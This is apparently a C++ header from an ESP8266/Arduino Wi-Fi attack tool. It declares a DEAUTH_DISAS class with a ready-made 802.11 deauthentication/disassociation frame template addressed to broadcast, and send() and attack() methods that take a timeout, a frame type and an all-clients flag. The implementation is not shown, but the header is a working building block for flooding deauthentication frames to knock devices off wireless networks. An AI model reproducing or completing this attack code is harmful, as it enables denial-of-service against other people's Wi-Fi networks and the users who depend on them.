#ifndef DEAUTH_DISAS_H
#define DEAUTH_DISAS_H
#include<Arduino.h>
#include"SCAN.h"
#include"MONITOR.h"
#include"MAC.h"

extern SCAN scan;
extern MONITOR mon;
extern "C" {
#include "user_interface.h"
}
class DEAUTH_DISAS {
  private:
    uint8_t packet[26] = {

      /* MAC header */
      /* 0 */       0xc0, //Type:0, Subtype: 12 (will be changed later)
      /* 1 */       0x00, //Flag
      /* 2 - 3 */   0x3a, 0x01, //Duration
      /* 4 - 9 */   0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   //Destination address (will be changed later)
      /* 10 - 15 */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   //Source address (will be changed later)
      /* 16 - 21 */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   //BSSID
      /* 22 - 23 */ 0x00, 0x00,   //Sequence number
      /* 24 - 25 */ 0x01, 0x00,   //Reason code (will be changed later)
    };
    void set(MAC to, MAC from, uint8_t fc);
  public:
    DEAUTH_DISAS();
    bool send();
    void attack(int timeout, uint8_t fc, int all); // fc = 0xc0 -> deauthentication frame | 0xa0 -> disassociation frame
    void start();
};
#endif
